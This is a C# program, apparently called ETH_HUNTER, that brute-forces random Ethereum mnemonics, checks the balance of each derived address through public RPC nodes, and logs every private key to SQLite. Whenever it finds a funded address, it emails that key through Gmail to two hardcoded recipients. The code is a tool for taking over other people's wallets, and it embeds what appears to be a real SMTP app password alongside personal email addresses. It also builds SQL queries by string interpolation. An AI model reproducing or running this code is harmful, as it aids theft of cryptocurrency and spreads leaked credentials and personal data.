using NBitcoin;
using Nethereum.HdWallet;
using Nethereum.Web3;
using Nethereum.Web3.Accounts;
using System.Data.SQLite;
using System.Diagnostics;
using System.Net.Mail;
using System.Net;

namespace ETH_HUNTER
{

    internal class Program
    {
        public static int index = 0;
        public static int guess = 0;
        public static int errors = 0;
        public static readonly int delay = 50;



        public static readonly string[] web3Urls = {
            "https://ethereum.publicnode.com",
            "https://nodes.mewapi.io/rpc/eth", //this errors
            "https://cloudflare-eth.com/",
            "https://rpc.flashbots.net/", //this errors
            "https://rpc.ankr.com/eth", //this errors
            "https://eth-mainnet.public.blastapi.io"
        };

        static void Main()
        {
            // Create the db if not created yet
            InitializeDataSet();

            // Open the connection to the database
            using (var con = new SQLiteConnection(Paths.database_connection))
            {
                con.Open();

                // Start clock
                Stopwatch stopwatch = new Stopwatch();
                stopwatch.Start();

                // Call the execution
                while (true)
                {
                    Generate(con, stopwatch);
                    Thread.Sleep(delay);
                }
            }
        }

        private static async void Generate(SQLiteConnection con, Stopwatch watch)
        {
            async Task ProcessThreadAsync(Web3 web, int threadIndex)
            {
                Mnemonic mnemonic = new Mnemonic(Wordlist.English, WordCount.Twelve);
                string password = "";
                Wallet wallet = new Wallet(mnemonic.ToString(), password);
                Account account = wallet.GetAccount(0);

                try
                {
                    var balance = await web.Eth.GetBalance.SendRequestAsync(account.Address);
                    if (Web3.Convert.FromWei(balance.Value) != 0)
                    {
                        Interlocked.Increment(ref guess);
                        sendMail("Address found: " + account.PrivateKey);
                    }

                    var data_cmd = new SQLiteCommand(con)
                    {
                        CommandText = $@"INSERT INTO data(key, balance, address) VALUES ('{account.PrivateKey}', '{balance}', '{account.Address}')"
                    };

                    data_cmd.ExecuteNonQuery();

                    Console.Clear();
                    Console.WriteLine($"[Elapsed] {watch.Elapsed} \n[Checked] {index} \n[Guessed] {guess} \n[Address] {account.Address} \n[Private] {account.PrivateKey} \n[Balance] {balance}\n[Problem] {errors / 18} \n======ETH-HUNTER-V1.0======");
                }
                catch
                {
                    Interlocked.Increment(ref errors);
                }

                Interlocked.Increment(ref index);

                if (index % 500000 == 0)
                {
                    sendMail("Status: alive. " + "Index: " + index);
                }
            }

            var tasks = web3Urls.Select((url, index) => ProcessThreadAsync(new Web3(url), index));

            await Task.WhenAll(tasks);
        }

        private static void sendMail(string body)
        {
            SmtpClient smtpClient = new SmtpClient("smtp.gmail.com")
            {
                Port = 587, // Port number for the SMTP server (587 for TLS, 465 for SSL, 25 for non-secure)
                Credentials = new NetworkCredential("eth.hunter.miner@gmail.com", "nbowhnrfngcdwhmv"),
                EnableSsl = true, // Use SSL/TLS to secure the connection (true for most modern SMTP servers)
            };

            // Create a new email message
            MailMessage mailMessage = new MailMessage
            {
                From = new MailAddress("eth.hunter.miner@gmail.com"),
                Subject = "Health Status",
                Body = body,
            };

            // Add recipients (you can add multiple recipients)
            mailMessage.To.Add("catalin0505229@gmail.com");
            mailMessage.To.Add("mpetrusenco@gmail.com");

            try
            {
                // Send the email
                smtpClient.Send(mailMessage);
                Console.WriteLine("Email sent successfully.");
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error sending email: " + ex.Message);
            }
        }


        private static void InitializeDataSet()
        {
            if (!Directory.Exists(Paths.fileLocation))
            {
                Directory.CreateDirectory(Paths.fileLocation);
            }

            if (!File.Exists(Paths.database))
            {
                var con = new SQLiteConnection(Paths.database_connection);
                File.WriteAllText(Paths.database, null);
                con.Open();
                var data_cmd = new SQLiteCommand(con)
                {
                    CommandText = @"CREATE TABLE data(key VARCRHAR(250), balance VARCRHAR(250) , address VARCHAR(250))"
                };

                data_cmd.ExecuteNonQuery();
                con.Close();
            }
        }
    }
}